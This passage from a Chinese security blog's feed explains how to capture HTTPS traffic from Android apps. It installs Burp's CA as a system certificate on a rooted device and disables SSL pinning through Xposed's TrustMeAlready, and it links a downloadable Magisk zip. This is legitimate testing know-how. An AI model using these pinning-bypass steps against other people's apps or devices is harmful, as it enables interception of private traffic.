<p>和我写PHPCMS爆破同理，有兴趣师傅可以看一下<a href="https://r0ser1.cn/2021/07/17/PHPCMSV9%E7%89%88%E6%9C%AC%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/">PHPCMS代码审计</a></p>
]]></content>
  </entry>
  <entry>
    <title>安卓无法抓取HTTPS问题</title>
    <url>/2021/07/20/%E5%AE%89%E5%8D%93%E6%97%A0%E6%B3%95%E6%8A%93%E5%8F%96HTTPS%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<center>安卓无法抓取HTTPS问题</center>

<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>1、证书问题</p>
<p>2、ssl pinning问题</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>如果不需要重放等功能直接使用 HttpCanary ，傻瓜式一键操作。</p>
<p>原因：新版本功能也比较强大，也是支持的但是就是不太舒服。</p>
<p>正经说 网上教程也太多了，就不说了。默认root+Magisk+EdXposed</p>
<h4 id="导入CA"><a href="#导入CA" class="headerlink" title="导入CA"></a>导入CA</h4><p>导出 Burp 根证书，然后用 openssl 将证书转换为安卓认识的 .0 文件</p>
<blockquote>
<p>openssl x509 -inform DER -in cacert.der -out cacert.pem<br>openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1</p>
</blockquote>
<p>//得到的字符串命名文件为 字符串.0 例如    9a5ba575.0</p>
<p>如果导出的是 Burp 的证书，操作正确文件名一定为 9a5ba575.0</p>
<p>如果不懂 Magisk 包的制作也不想了解怎么制作直接将这个文件扔进 <code>/system/etc/security/cacerts</code> 然后权限改为 600，最后重启就行了</p>
<p>如果想用 Magisk 加载就用我提供的 copy_burp_ca.zip，替换压缩包里的 <code>/system/etc/security/cacerts/9a5ba575.0</code> 为你自己的文件，然后用 Magisk 刷入</p>
<h4 id="加载-SSLUnpinning"><a href="#加载-SSLUnpinning" class="headerlink" title="加载 SSLUnpinning"></a>加载 SSLUnpinning</h4><p>Xposed 使用 <a href="https://github.com/ElderDrivers/EdXposed">EdXposed</a>，如果 root 管理器使用的是 Magisk 可以直接在然后 Magisk 里面搜 EdXposed 就可安装，EdXposed 装好后加载 <a href="https://github.com/ViRb3/TrustMeAlready">TrustMeAlready</a> 可开启 SSLUnpinning<br>网上看到很多人说用JustTrustMe，亲测效果很差。这个很OK。</p>
<h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="https://pan.baidu.com/s/18ej1cRfnEkzOKXICeYUFEQ">copy_burp_ca.zip</a>提取码:6d64</p>
<p>参考：<a href="https://loli.world/archives/fxxk-android-app/">https://loli.world/archives/fxxk-android-app/</a></p>
]]></content>
      <tags>
        <tag>杂七杂八</tag>
      </tags>
  </entry>
</search>
